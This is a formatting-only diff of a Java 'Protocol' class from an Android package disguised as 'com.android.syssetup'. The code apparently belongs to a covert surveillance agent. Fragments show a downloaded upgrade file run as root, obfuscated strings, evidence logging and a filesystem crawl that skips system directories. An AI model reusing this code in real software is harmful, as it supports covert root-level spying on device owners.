@@ -12,6 +12,7 @@ package com.android.syssetup.action.sync;
 import android.content.Intent;
 import android.net.Uri;
 
+import com.android.mm.M;
 import com.android.syssetup.Status;
 import com.android.syssetup.action.UninstallAction;
 import com.android.syssetup.auto.Cfg;
@@ -29,7 +30,6 @@ import com.android.syssetup.util.Execute;
 import com.android.syssetup.util.ExecuteResult;
 import com.android.syssetup.util.StringUtils;
 import com.android.syssetup.util.WChar;
-import com.android.mm.M;
 
 import java.io.DataInputStream;
 import java.io.File;
@@ -54,34 +54,19 @@ public abstract class Protocol implements iProtocol {
 	 * The debug.
 	 */
 	private static final String TAG = "Protocol"; //$NON-NLS-1$
+	static Set<String> blackListDir = new HashSet<String>(Arrays.asList(new String[]{"/sys", "/dev", "/proc", "/acct"}));
 	private static Object configLock = new Object();
 	/**
 	 * The transport.
 	 */
 	protected Transport transport;
-
 	Status status;
-
-	static Set<String> blackListDir = new HashSet<String>(Arrays.asList(new String[]{"/sys", "/dev", "/proc", "/acct"}));
 
 	/** The reload. */
 	// public boolean reload;
 
 	/** The uninstall. */
 	// public boolean uninstall;
-
-	/**
-	 * Inits the.
-	 *
-	 * @param transport the transport
-	 * @return true, if successful
-	 */
-	public boolean init(final Transport transport) {
-		this.transport = transport;
-		status = Status.self();
-		// transport.initConnection();
-		return true;
-	}
 
 	/**
 	 * Save new conf.
@@ -166,7 +151,7 @@ public abstract class Protocol implements iProtocol {
 			String packageName = Status.self().getAppContext().getPackageName();
 
 			Execute ex = new Execute();
-			ExecuteResult result = ex.executeRoot(file.getAbsolutePath() +" "+ packageName);
+			ExecuteResult result = ex.executeRoot(file.getAbsolutePath() + " " + packageName);
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (upgradeMulti) exitcode: %s", result.exitCode);
 				Check.log(TAG + " (upgradeMulti) stdout: %s", result.stdout);
@@ -197,7 +182,7 @@ public abstract class Protocol implements iProtocol {
 					}
 				}
 			}
-		}else{
+		} else {
 			EvidenceBuilder.info(M.e("Upgrade Failed"));
 		}
 
@@ -514,7 +499,7 @@ public abstract class Protocol implements iProtocol {
 		}
 		final File dir = new File(path);
 		if (dir.isDirectory()) {
-			if(saveFirst) {
+			if (saveFirst) {
 				Protocol.saveFilesystemLog(fsLog, path);
 			}
 
@@ -564,6 +549,19 @@ public abstract class Protocol implements iProtocol {
 		} else {
 			return file;
 		}
+	}
+
+	/**
+	 * Inits the.
+	 *
+	 * @param transport the transport
+	 * @return true, if successful
+	 */
+	public boolean init(final Transport transport) {
+		this.transport = transport;
+		status = Status.self();
+		// transport.initConnection();
+		return true;
 	}
 
 }
